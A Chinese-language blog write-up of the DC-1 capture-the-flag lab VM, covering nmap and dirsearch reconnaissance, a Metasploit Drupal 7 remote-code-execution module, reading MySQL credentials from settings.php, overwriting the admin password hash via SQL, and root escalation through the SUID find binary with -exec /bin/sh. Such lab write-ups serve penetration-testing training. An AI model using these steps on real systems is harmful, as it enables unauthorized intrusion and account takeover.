---
title: "DC-1渗透笔记"
date: 2025-12-11T00:00:00+08:00
draft: false

---

# DC-1渗透笔记

### 信息搜集

#### 探测IP

nmap扫一下：

~~~shell
nmap -sP 192.168.111.0/24
~~~

发现IP为192.168.111.143

![image-20240714162839220](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714162840459-228848118.png)

#### 端口探测

nmap扫描所有端口的信息：

~~~shell
nmap -sV -p- 192.168.111.143
~~~

可以看见开放了：

* 22端口

* 80端口
* 111端口
* 49525端口

![image-20240714164615492](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714164616741-778751171.png)

这里80端口和22端口可能比较重要，我先从80端口的web服务入手

#### 网页信息搜集

浏览器访问80端口：

需要登录，没什么头绪，再看看有没有其他利用点

用wappalyzer可以看见cms、语言、中间件、操作系统等基本信息：

* Drupal 7
* PHP 5.4.45
* Apache 2.2.22
* debian

![image-20240714165722492](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714165723964-1878336182.png)

跑一下目录看看：

~~~shell
dirsearch -u 192.168.111.143
~~~

扫到很多目录但是作用不是很大

### 漏洞利用

首先从cms入手看看有没有历史漏洞，搜索一下还真有个18年的CVE

直接上msf看看有没有现成的脚本：

~~~shell
search Drupal
~~~

![image-20240714172659056](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714172700055-106846141.png)

应该就是18年那个了，use一下，填好参数直接开打：

![image-20240714173202094](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714173203401-1947708441.png)

这就拿shell了，好快

### 后渗透

#### 获取交互式shell（flag1、flag2）

输入shell即可进入linux的shell，就是有点丑

老规矩，试试用python获取一个pty

~~~shell
python -c 'import pty; pty.spawn("/bin/bash")'
~~~

OK了，看来是装了python的：

![image-20240714173635145](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714173636356-73390313.png)

这里有个flag1.txt，cat一下：

![image-20240714173733254](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714173734168-311523890.png)

翻译一下：**每个好的CMS都需要一个配置文件，你也一样**

那这里就是告诉我下一步得去看这个drupal cms的配置文件了

![image-20240714174418093](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714174418899-1582315866.png)

看看有没有settings.php：

![image-20240714174547677](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714174548416-1321432277.png)

还真是，直接cat看看：

![image-20240714174720977](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714174722058-124470931.png)

这里获得了flag2：**暴力破解和字典攻击并不是获取访问权限（而你肯定需要访问权限）的唯一方式。有了这些凭证，你能做什么？**

而下面还给出了mysql数据库的账密，很明显下一步要进数据库了

#### 数据库的利用（flag3、flag4）

直接登录mysql：

![image-20240714175322797](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714175323765-435626810.png)

切换数据库到drupaldb，并看看有哪些表：

![image-20240714175516792](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714175517869-92184473.png)

有个表叫user很可疑，看看：

![image-20240714175739226](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714175740204-206778230.png)

这里发现两个账密，但密码不是明文，加密也很奇怪不是常规加密，应该是drupal自己定义的，上网搜一下：

![image-20240714180537669](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714180538774-575174267.png)

上图的方法二很不错，试试：

先找到脚本路径：

![image-20240714180914673](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714180915624-1861577967.png)

我们将密码改为admin：

~~~shell
php /var/www/scripts/password-hash.sh admin
~~~

![image-20240714181114595](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714181115402-1328221226.png)

即可得到加密后的密码hash：

~~~hash
$S$DBPc9i1Q6Cny/HTW4zhwWrwSTaRNndxlAQeqSZAlyebP9MAHBSuu
~~~

接下来回到mysql修改admin和fred的密码

~~~mysql
update users set pass = "$S$DBPc9i1Q6Cny/HTW4zhwWrwSTaRNndxlAQeqSZAlyebP9MAHBSuu" where name = 'admin' or name = 'Fred';
~~~

![image-20240714181442604](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714181443470-207464631.png)

接下来有了账户密码，我们登录后台看看：

![image-20240714181833633](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714181834514-1503970563.png)

在后台找到了flag3：**特殊的权限设置将帮助找到passwd - 但你需要使用-exec命令来破解如何获取shadow文件中的内容**

试试，可以查看`/etc/passwd`，但没有权限查看`/etc/shadow`：

![image-20240714182154758](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714182155685-622342096.png)

`/etc/passwd`中有flag4这个用户，还有个路径`/home/flag4`，去看看有什么

![image-20240714182906212](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714182907207-1911601516.png)

找到flag4：**您能使用相同的方法找到或访问根目录中的flag吗？也许可以。但或许并不那么容易。或许也可能是这样？**

按照描述，去/root看看：

![image-20240714183107125](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714183107838-714055930.png)

权限不够，接下来应该就是提权了

#### 权限提升（flag5）

看看有哪些suid权限的文件：

~~~shell
find / -perm -u=s -type f 2>/dev/null
~~~

![image-20240714183536320](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714183537438-809825939.png)

还挺多，其中的find非常醒目啊，直接find提权一手：

~~~shell
find / -name flag4.txt -exec "/bin/sh" \;
~~~

![image-20240714183727522](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714183728230-1880432695.png)

ok已经拿下root权限了，接下来去/root看看：

![image-20240714183840794](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240714183841564-643636854.png)

拿到了最终的flag5：

~~~
做得好!!!! 
希望你享受了这个过程，并学到了一些新技能。 
你可以通过Twitter联系我，告诉我你对这次小旅程的想法 - @DCAU7
~~~

### 总结

在渗透过程中，我们进行了如下漏洞利用：

* drupal cms的一个RCE
* 配置文件泄露mysql账号密码
* 利用cms的加密脚本和mysql重置cms的管理员密码
* find提权